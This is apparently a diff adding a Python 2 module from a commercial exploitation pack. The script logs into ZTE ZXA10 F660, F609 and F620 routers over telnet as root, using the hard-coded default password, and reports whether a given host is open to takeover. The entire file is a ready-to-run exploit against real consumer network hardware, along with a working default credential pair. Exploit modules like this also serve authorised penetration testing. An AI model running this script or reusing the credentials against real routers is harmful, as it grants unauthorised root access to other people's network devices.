@@ -1,0 +1,55 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+###
+# STD modules
+###
+import os, sys
+try:
+  import telnetlib
+except:
+  print 'No module telnetlib'
+  sys.exit()
+
+_name_   = 'd2sec_zte_1'
+_vendor_ = 'zte'
+_model_  = ['ZTE ZXA10 F660', 'ZTE ZXA10 F609', 'ZTE ZXA10 F620']
+_vuln_   = 'Default Root Password Vulnerability'
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  print '[#] Host : %s'  %host
+  try:
+    print '[+] Trying to authenticate to the telnet server'
+    tn = telnetlib.Telnet(host, 23)
+    tn.expect(["Login: ", "login: "], 5)
+    tn.write("root\r\n")
+    tn.expect(["Password: ", "password"], 5)
+    tn.write("Zte521\r\n")
+    tn.write("\r\n")
+    (i, obj, res) = tn.expect(["Incorrect", "incorrect"], 5)
+    if i != -1:
+      print '[-] Exploit failed, %s is not vulnerable' % host 
+    else:
+      if any(map(lambda x: x in res, ["#", "$", ">"])):
+        print '[+] Authentication successfull'
+        print '[+] %s is vulnerable : telnetd service enabled with default creds root/Zte521' % host
+        tn.write("\r\n")
+      else:
+        print '[-] Exploit failed, %s is not vulnerable' % host
+    tn.close()
+  except Exception, e:
+    print '[-] connection error: %s' % e
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
